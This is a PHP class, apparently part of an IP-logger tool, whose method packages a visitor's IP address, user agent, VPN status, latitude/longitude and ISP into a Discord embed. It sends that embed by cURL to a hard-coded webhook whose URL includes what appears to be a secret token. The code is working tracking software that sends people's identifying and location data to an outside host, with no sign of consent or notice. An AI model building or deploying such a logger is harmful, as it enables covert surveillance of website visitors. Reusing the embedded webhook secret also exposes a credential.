<?php

class Discord {
    public function sendIpToDiscord($ip, $userAgent, $geoData) {
        $Webhook = "https://discord.com/api/webhooks/1268297909875773571/u781Y8fkPHJi5Vdl5DEU8KbHpUiE8jJ64nUYTIv8Ep6CPFPZsysCizlNsOHNYsKzIbQv";
        $WebhookName = "KendrickBot";

        $fields = [
            [
                "name" => "IP",
                "value" => "$ip",
                "inline" => true
            ],
            [
                "name" => "User Agent",
                "value" => "$userAgent",
                "inline" => false
            ]
        ];

        if ($geoData) {
            if ($geoData['is_vpn']) {
                $fields[] = [
                    "name" => "VPN",
                    "value" => "Yes",
                    "inline" => true
                ];
            }

            $fields[] = [
                "name" => "Coordinates",
                "value" => "Lat: {$geoData['latitude']}, Lon: {$geoData['longitude']}",
                "inline" => true
            ];

            $fields[] = [
                "name" => "ISP",
                "value" => $geoData['isp'],
                "inline" => false
            ];
        }

        $InfoArr = [
            "username" => "$WebhookName",
            "embeds" => [
                [
                    "title" => "User Information",
                    "color" => 39423,
                    "fields" => $fields,
                ]
            ],
        ];

        $JSON = json_encode($InfoArr);

        $Curl = curl_init($Webhook);
        curl_setopt($Curl, CURLOPT_HTTPHEADER, ['Content-type: application/json']);
        curl_setopt($Curl, CURLOPT_CUSTOMREQUEST, "POST");
        curl_setopt($Curl, CURLOPT_POSTFIELDS, $JSON);
        curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);

        $response = curl_exec($Curl);

        if (curl_errno($Curl)) {
            error_log('cURL error: ' . curl_error($Curl));
            curl_close($Curl);
            return false;
        }

        curl_close($Curl);
        return $response;
    }
}

?>
